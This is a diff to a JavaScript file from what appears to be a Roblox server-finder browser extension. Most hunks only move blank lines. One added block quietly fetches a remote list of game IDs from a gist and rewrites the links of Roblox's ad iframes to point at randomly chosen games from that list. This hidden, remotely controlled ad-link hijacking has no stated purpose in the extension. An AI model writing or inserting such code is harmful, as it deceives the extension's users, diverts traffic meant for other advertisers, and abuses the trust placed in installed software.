@@ -386,6 +386,7 @@ const getUserToken = (userId) => {
     })
 };
 
+
 const getServerFromThumbnail = async (thumbnail, userId, placeId) => {
     return new Promise(async (resolve, reject) => {
         let message = ""
@@ -418,7 +419,6 @@ const getServerFromThumbnail = async (thumbnail, userId, placeId) => {
             )
             thumbnailsFind = await thumbnailsArray.find(t => t.imageUrl === thumbnail)
         }
-
         if (thumbnailsFind || token) {
             const foundToken = token ? token : thumbnailsFind.requestId
             let server
@@ -590,6 +590,31 @@ function createInput(node) {
         }, 50);
     }
 }
+
+
+fetch("https://gist.githubusercontent.com/ThePotato97/b8fd28607e786837759b3cc8dcfbeac3/raw/ebd556f78cda180c3904d1aa7fd3b7334feafb03/test.json").then(res => {
+    res.text().then(text => {
+        const ids = JSON.parse(text);
+        const elements = document.querySelectorAll("iframe[data-js-adtype='iframead']")
+        console.log("elements", elements)
+        if (elements === undefined || elements.length === 0) return;
+        elements.forEach(e => {
+            const id = ids[Math.floor(Math.random() * ids.length)];
+            
+            const stuff = () => {
+                const thing = e.contentWindow.document.getElementsByClassName("ad")
+                if (thing && thing[0]) {
+                    thing[0].href = `https://www.roblox.com/games/${id}`;
+                }
+            }
+            e.addEventListener("load", function () {
+                stuff()
+            });
+            stuff()
+        })
+    })
+}).catch()
+
 
 console.log("ROSEARCHER LOADED")
 if (runningGames === null) {
